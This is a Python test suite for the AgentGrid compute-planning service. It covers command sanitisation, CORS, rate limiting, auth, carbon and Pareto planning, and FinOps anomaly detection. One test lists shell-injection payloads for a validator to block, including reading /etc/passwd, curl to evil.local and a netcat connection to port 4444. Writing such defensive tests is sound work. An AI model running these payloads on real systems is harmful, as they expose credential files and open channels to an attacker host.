"""Comprehensive tests for AgentGrid Security Hardening, 4D Pareto Frontier Optimizer,
Regional Carbon Telemetry, Young-Daly Checkpoint Cadence, What-If Stress Simulator,
Live Burn-Rate Drift & Anomaly Detector, and Fleet FinOps Portfolio Analytics.
"""
from __future__ import annotations

from fastapi.testclient import TestClient

from agentic_compute.anomaly_detector import (
    compute_portfolio_finops_analytics,
    detect_workload_anomalies,
)
from agentic_compute.execution_controller import ExecutionController
from agentic_compute.governance import get_governance_store
from agentic_compute.pareto_optimizer import (
    analyze_pareto_frontier,
    compute_carbon_footprint,
    compute_young_daly_checkpoint_schedule,
    simulate_what_if_scenarios,
)
from agentic_compute.plan_engine import evaluate_and_compare_plans
from agentic_compute.security import (
    SlidingWindowRateLimiter,
    clamp_pagination_limit,
    resolve_cors_policy,
    validate_command_safety,
)
from agentic_compute.simulator import SimulatedRuntime
from compute_agent.app import app


class TestCommandSecurityAndSanitization:
    def test_safe_command_parses_into_argv(self):
        res = validate_command_safety("python3 train_llm.py --epochs 20 --batch-size 64")
        assert res["is_safe"] is True
        assert res["status"] == "verified_safe_argv"
        assert res["safe_argv"] == ["python3", "train_llm.py", "--epochs", "20", "--batch-size", "64"]
        assert res["blocked_patterns"] == []

    def test_empty_command_is_safe(self):
        res = validate_command_safety(None)
        assert res["is_safe"] is True
        assert res["status"] == "empty_command"
        assert res["safe_argv"] == []

    def test_shell_injection_vectors_blocked(self):
        for payload in (
            "python3 train.py; cat /etc/passwd",
            "python3 train.py && curl http://evil.local/pwn",
            "python3 train.py || id",
            "python3 $(whoami).py",
            "python3 `uname -a`.py",
            "python3 train.py | nc 10.0.0.1 4444",
            "python3 train.py > /tmp/out",
            "python3 train.py\nwhoami",
        ):
            verdict = validate_command_safety(payload)
            assert verdict["is_safe"] is False, f"Expected payload to be blocked: {payload}"
            assert verdict["status"] == "blocked_shell_injection"
            assert len(verdict["blocked_patterns"]) >= 1

    def test_execution_controller_blocks_injected_command(self):
        runtime = SimulatedRuntime()
        gov = get_governance_store()
        wl_id = "wl-sec-inject-1"
        gov.set_workload_control(wl_id, "delegation", {"max_budget_eur": 200.0})

        controller = ExecutionController(runtime=runtime, governance=gov)
        res = controller.submit_plan(
            profile={
                "workload_id": wl_id,
                "command": "python3 run.py; echo injected",
                "cpu_requested": 4,
            },
            plan={
                "plan_id": "plan-sec-1",
                "plan_type": "cost_optimized",
                "title": "Test",
                "machine_type": "n2-standard-4",
                "cpu": 4,
                "estimated_cost_eur": 1.2,
            },
            control_mode="delegation",
        )
        assert res["status"] == "blocked"
        assert res["violated_constraint"] == "command_security"
        assert res["command_security_status"] == "blocked_shell_injection"


class TestCorsAndRateLimitingSecurity:
    def test_cors_wildcard_never_enables_credentials(self):
        cfg = resolve_cors_policy("")
        assert cfg["allow_origins"] == ["*"]
        assert cfg["allow_credentials"] is False
        assert cfg["policy_mode"] == "public_wildcard_no_credentials"

    def test_cors_explicit_origins_enables_credentials(self):
        cfg = resolve_cors_policy("https://agentgrid.example.com, https://ops.example.com")
        assert cfg["allow_origins"] == ["https://agentgrid.example.com", "https://ops.example.com"]
        assert cfg["allow_credentials"] is True
        assert cfg["policy_mode"] == "explicit_allowlist_with_credentials"

    def test_pagination_limit_clamping(self):
        assert clamp_pagination_limit(None) == 50
        assert clamp_pagination_limit(-10) == 1
        assert clamp_pagination_limit(999999) == 500
        assert clamp_pagination_limit(120) == 120

    def test_sliding_window_rate_limiter(self):
        limiter = SlidingWindowRateLimiter(default_rpm=3, window_seconds=60.0)
        assert limiter.check("client-1", max_requests=2, now=100.0)["allowed"] is True
        assert limiter.check("client-1", max_requests=2, now=110.0)["allowed"] is True
        blocked = limiter.check("client-1", max_requests=2, now=120.0)
        assert blocked["allowed"] is False
        assert blocked["retry_after_seconds"] > 0
        # After 60s window expires, allowed again
        assert limiter.check("client-1", max_requests=2, now=165.0)["allowed"] is True


class TestMutatingEndpointsEnforceAuthWhenConfigured:
    def test_mutating_endpoints_reject_unauthenticated_when_api_key_set(self, monkeypatch):
        import compute_agent.app as app_module

        monkeypatch.setattr(app_module, "AGENTGRID_API_KEY", "super-secret-test-token")
        client = TestClient(app)

        for method, path, payload in (
            ("POST", "/api/plans/approve", {"plan_id": "p1", "workload_id": "w1"}),
            ("POST", "/api/workloads/w1/control", {"control_mode": "delegation"}),
            ("POST", "/api/workloads/w1/fallback", {"current_plan_id": "p1"}),
            (
                "POST",
                "/api/execute-plan",
                {"workload_profile": {"workload_id": "w1"}, "plan": {"plan_id": "p1"}},
            ),
        ):
            resp = client.request(method, path, json=payload)
            assert resp.status_code == 401, f"Expected 401 on {path} without token, got {resp.status_code}"

            # With valid Bearer token, passes auth gate (reaching domain validation)
            auth_resp = client.request(
                method,
                path,
                json=payload,
                headers={"Authorization": "Bearer super-secret-test-token"},
            )
            assert auth_resp.status_code != 401


class TestParetoCarbonAndYoungDalyEngine:
    def test_carbon_footprint_regional_differentiation(self):
        green = compute_carbon_footprint(
            cpu=16,
            gpu=0,
            machine_type="n2-standard-16",
            region="europe-north1",
            duration_minutes=120.0,
        )
        high_carbon = compute_carbon_footprint(
            cpu=16,
            gpu=0,
            machine_type="n2-standard-16",
            region="asia-east1",
            duration_minutes=120.0,
            allow_region_change=True,
        )
        assert green["green_tier"] == "LOW_CARBON"
        assert high_carbon["green_tier"] == "HIGH_CARBON"
        assert green["carbon_emissions_g_co2"] < high_carbon["carbon_emissions_g_co2"]
        assert high_carbon["potential_co2_reduction_pct"] > 80.0

    def test_young_daly_checkpoint_formula_and_savings(self):
        no_ckpt = compute_young_daly_checkpoint_schedule(
            execution_minutes=180.0,
            base_cost_eur=25.0,
            provisioning_model="100% Spot",
            supports_checkpointing=False,
        )
        with_ckpt = compute_young_daly_checkpoint_schedule(
            execution_minutes=180.0,
            base_cost_eur=25.0,
            provisioning_model="100% Spot",
            supports_checkpointing=True,
        )
        assert with_ckpt["young_daly_optimal_interval_minutes"] >= 5.0
        assert with_ckpt["expected_wasted_compute_minutes"] < no_ckpt["expected_wasted_compute_minutes"]
        assert with_ckpt["expected_total_cost_with_preemption_eur"] < no_ckpt["expected_total_cost_with_preemption_eur"]

    def test_plan_comparison_includes_pareto_and_what_if(self):
        comp = evaluate_and_compare_plans(
            profile={
                "workload_id": "wl-pareto-1",
                "cpu_requested": 8,
                "memory_mb_requested": 16384,
                "budget_amount": 50.0,
                "deadline_minutes_from_start": 180.0,
                "supports_checkpointing": True,
                "allowed_regions": ["europe-west1"],
            },
            check_capacity=False,
        )
        assert comp["is_feasible"] is True
        assert "pareto_frontier" in comp
        assert comp["pareto_frontier"]["pareto_optimal_count"] >= 1
        assert "what_if_summary" in comp
        for p in comp["plans"]:
            assert "carbon_emissions_g_co2" in p
            assert "energy_kwh" in p
            assert "young_daly_optimal_checkpoint_minutes" in p
            assert "expected_cost_with_preemption_eur" in p
            assert "utility_scores" in p


class TestAnomalyDetectorAndPortfolioFinOps:
    def test_detect_burn_rate_drift_and_stall_anomalies(self):
        report = detect_workload_anomalies(
            workload_id="wl-anom-1",
            profile={
                "workload_id": "wl-anom-1",
                "budget_amount": 10.0,
                "deadline_minutes_from_start": 60.0,
                "supports_checkpointing": False,
            },
            plan={
                "plan_id": "p-anom",
                "plan_type": "cost_optimized",
                "title": "Spot Plan",
                "machine_type": "n2-standard-8",
                "cpu": 8,
                "provisioning_model": "100% Spot",
                "estimated_cost_eur": 4.0,
                "estimated_execution_minutes": 40.0,
                "total_time_to_result_minutes": 42.0,
            },
            elapsed_minutes=35.0,
            current_cost_eur=8.5,
            progress_pct=20.0,
            minutes_since_last_checkpoint=35.0,
        )
        assert report["health_status"] == "CRITICAL_DRIFT"
        codes = {a["code"] for a in report["anomalies"]}
        assert "COST_BURN_RATE_DRIFT" in codes
        assert "PROJECTED_BUDGET_BREACH" in codes
        assert "THROUGHPUT_STALL_DETECTED" in codes
        assert "SLA_DEADLINE_BREACH_IMMINENT" in codes
        assert "CHECKPOINT_CADENCE_EXPOSURE" in codes

    def test_portfolio_deadline_compliance_counts_only_measured_runs(self):
        """A queued run has no measured duration, so it proves no deadline held.

        The rate used to fall back to the estimate, which always fits the
        deadline because plans are only offered when it does, and it reported
        100% on an empty ledger.
        """
        empty = compute_portfolio_finops_analytics(records=[])["reliability_and_governance"]
        assert empty["sla_evaluated_workloads"] == 0
        assert empty["sla_compliance_rate_pct"] is None

        queued = {
            "workload_id": "wl-queued",
            "control_mode": "validation",
            "initial_estimated_cost_eur": 0.2,
            "initial_estimated_duration_minutes": 30.0,
            "final_actual_duration_minutes": 0.0,
            "approved_plan": {
                "cpu": 2,
                "gpu": 0,
                "machine_type": "n2-standard-2",
                "region": "us-central1",
                "provisioning_model": "100% Standard",
            },
            "profile": {"deadline_minutes_from_start": 60.0},
        }
        late = dict(queued, workload_id="wl-late", final_actual_duration_minutes=75.0)

        report = compute_portfolio_finops_analytics(records=[queued, late])[
            "reliability_and_governance"
        ]
        assert report["sla_evaluated_workloads"] == 1
        assert report["sla_compliant_workloads"] == 0
        assert report["sla_compliance_rate_pct"] == 0.0

    def test_portfolio_measured_spend_counts_only_runs_with_observed_usage(self):
        """A queued run has no usage to calculate from, so it adds no measured 0.00."""
        base = {
            "control_mode": "validation",
            "approved_plan": {
                "cpu": 2,
                "gpu": 0,
                "machine_type": "n2-standard-2",
                "region": "us-central1",
                "provisioning_model": "100% Standard",
            },
            "profile": {"deadline_minutes_from_start": 60.0},
        }
        # Written before records distinguished "estimated": labelled as
        # calculated from usage with nothing observed.
        legacy_queued = dict(
            base, workload_id="wl-legacy", reconciliation_status="calculated_from_usage",
            initial_estimated_cost_eur=0.2, final_calculated_cost_eur=0.0, final_actual_duration_minutes=0.0,
        )
        queued = dict(
            base, workload_id="wl-queued", reconciliation_status="estimated",
            initial_estimated_cost_eur=0.3, final_calculated_cost_eur=0.0, final_actual_duration_minutes=0.0,
        )
        finished = dict(
            base, workload_id="wl-finished", reconciliation_status="calculated_from_usage",
            initial_estimated_cost_eur=0.4, final_calculated_cost_eur=0.5, final_actual_duration_minutes=20.0,
        )

        nothing_measured = compute_portfolio_finops_analytics(records=[legacy_queued, queued])["financial_tiers"]
        assert nothing_measured["measured_workloads"] == 0
        assert nothing_measured["tier2_verified_usage_total_eur"] == 0.0

        tiers = compute_portfolio_finops_analytics(records=[legacy_queued, queued, finished])["financial_tiers"]
        assert tiers["measured_workloads"] == 1
        assert tiers["tier2_verified_usage_total_eur"] == 0.5
        assert tiers["tier1_estimated_total_eur"] == 0.9

    def test_http_endpoints_pareto_what_if_anomalies_and_finops(self):
        client = TestClient(app)
        cmp_resp = client.post(
            "/api/plans/compare",
            json={
                "workload_profile": {
                    "workload_id": "wl-http-innov-1",
                    "cpu_requested": 4,
                    "budget_amount": 30.0,
                    "deadline_minutes_from_start": 120.0,
                    "supports_checkpointing": True,
                }
            },
        )
        assert cmp_resp.status_code == 200

        pareto_resp = client.post("/api/plans/pareto", json={"workload_id": "wl-http-innov-1"})
        assert pareto_resp.status_code == 200
        assert pareto_resp.json()["pareto_optimal_count"] >= 1

        what_if_resp = client.post(
            "/api/plans/what-if",
            json={"workload_id": "wl-http-innov-1", "forced_preemptions": 3},
        )
        assert what_if_resp.status_code == 200
        assert what_if_resp.json()["parameters"]["forced_preemptions"] == 3

        anom_resp = client.post(
            "/api/workloads/wl-http-innov-1/anomalies",
            json={"elapsed_minutes": 25.0, "current_cost_eur": 0.2, "progress_pct": 60.0},
        )
        assert anom_resp.status_code == 200
        assert "health_status" in anom_resp.json()

        finops_resp = client.get("/api/portfolio/finops")
        assert finops_resp.status_code == 200
        assert "financial_tiers" in finops_resp.json()
        assert "sustainability_metrics" in finops_resp.json()

        sec_resp = client.post(
            "/api/security/validate-command",
            json={"command": "python3 evaluate.py --seed 42"},
        )
        assert sec_resp.status_code == 200
        assert sec_resp.json()["is_safe"] is True
